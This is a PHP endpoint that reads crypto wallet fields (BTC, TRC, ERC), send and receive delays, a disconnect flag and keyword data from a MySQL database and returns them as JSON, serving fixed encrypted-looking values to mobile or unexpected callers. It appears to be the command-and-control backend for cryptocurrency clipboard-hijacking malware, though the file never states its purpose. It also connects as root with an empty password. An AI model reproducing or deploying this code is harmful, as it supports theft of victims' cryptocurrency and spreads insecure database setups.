<?php
if(isset($_GET['IS_PC'])) $is_pc = $_GET['IS_PC'];
else $is_pc = '0';
if($is_pc == 0) $is_pc = '0';
if($is_pc == 1) $is_pc = '1';

function isMobile() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

if(($is_pc == '0') && (isMobile() == false)) {
	echo '{"SEND_DELAY":0,"RECEIVE_DELAY":0,"BTC":"Mlc\/YzrsDwF14eO8fY++tAxWpgmhyaUivYxCqt2g5CNO91yoP6s3OrNelfiDAyJK","TRC":"b9p128SX8uN+PQ8hoFME8rGwdqKN9DNKWhb0DhBdYeXcSwYftQF4KbpswQYxhwPA","ERC":"C8sIVffsAE3z80j2n8H5cX888TDvX93+r13buRZ+ic1W0s9QeNIr5yhK1fIYezqy","RX_BTC":"Mlc\/YzrsDwF14eO8fY++tAxWpgmhyaUivYxCqt2g5CNO91yoP6s3OrNelfiDAyJK","RX_TRC":"b9p128SX8uN+PQ8hoFME8rGwdqKN9DNKWhb0DhBdYeXcSwYftQF4KbpswQYxhwPA","RX_ERC":"C8sIVffsAE3z80j2n8H5cX888TDvX93+r13buRZ+ic1W0s9QeNIr5yhK1fIYezqy"}';
	return;
}

if(($is_pc != '0') && ($is_pc != '1')) {
	echo '{"SEND_DELAY":0,"RECEIVE_DELAY":0,"BTC":"Mlc\/YzrsDwF14eO8fY++tAxWpgmhyaUivYxCqt2g5CNO91yoP6s3OrNelfiDAyJK","TRC":"b9p128SX8uN+PQ8hoFME8rGwdqKN9DNKWhb0DhBdYeXcSwYftQF4KbpswQYxhwPA","ERC":"C8sIVffsAE3z80j2n8H5cX888TDvX93+r13buRZ+ic1W0s9QeNIr5yhK1fIYezqy","RX_BTC":"Mlc\/YzrsDwF14eO8fY++tAxWpgmhyaUivYxCqt2g5CNO91yoP6s3OrNelfiDAyJK","RX_TRC":"b9p128SX8uN+PQ8hoFME8rGwdqKN9DNKWhb0DhBdYeXcSwYftQF4KbpswQYxhwPA","RX_ERC":"C8sIVffsAE3z80j2n8H5cX888TDvX93+r13buRZ+ic1W0s9QeNIr5yhK1fIYezqy"}';
	return;
}

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "buchananapp_pc";

if(isset($_GET['ID'])) $logId = $_GET['ID'];
//else return;
if(isset($_GET['ID']) && strlen($logId) > 10 ) {
	return;
}
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
$conn->set_charset('utf8mb4'); // charset

 $endResult = (object)[];
//$sql = "SELECT SEND_DELAY, RECEIVE_DELAY FROM logs WHERE ID=".$logId;
//$result = $conn->query($sql);
$stmt = $conn->prepare('SELECT SEND_DELAY, RECEIVE_DELAY, DISCONNECTING FROM logs WHERE ID= ?');
$stmt->bind_param('s', $logId);
$stmt->execute();
$result = $stmt->get_result();
      
if ($result->num_rows > 0) {
   	$row = $result->fetch_assoc();
   	$endResult->SEND_DELAY = $row["SEND_DELAY"];
   	$endResult->RECEIVE_DELAY = $row["RECEIVE_DELAY"];
	$endResult->DISCONNECTING = $row["DISCONNECTING"];
}
else{
	$endResult->SEND_DELAY = 0;
   	$endResult->RECEIVE_DELAY = 0;
	$endResult->DISCONNECTING = 0;
}
   
// $sql = "SELECT * FROM address";
// $result = $conn->query($sql);
$stmt = $conn->prepare('SELECT * FROM address');
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
 	$row = $result->fetch_assoc();
 	$endResult->BTC = $row["BTC"];
	$endResult->TRC = $row["TRC"];
	$endResult->ERC = $row["ERC"];
	// $endResult->RX_BTC = $row["RX_BTC"];
	// $endResult->RX_TRC = $row["RX_TRC"];
	// $endResult->RX_ERC = $row["RX_ERC"];
	$endResult->RX_BTC = "";
	$endResult->RX_TRC = "";
	$endResult->RX_ERC = "";

	$endResult->INITIAL_TIME = $row["INITIAL_TIME"];
}
else{
	$endResult->BTC = null;
	$endResult->TRC = null;
	$endResult->ERC = null;
	$endResult->RX_BTC = null;
	$endResult->RX_TRC = null;
	$endResult->RX_ERC = null;
	$endResult->INITIAL_TIME = 0;
}
$endResult->KEYWORDS = file_get_contents("kjson.php");

echo json_encode($endResult);
$conn->close();
 ?>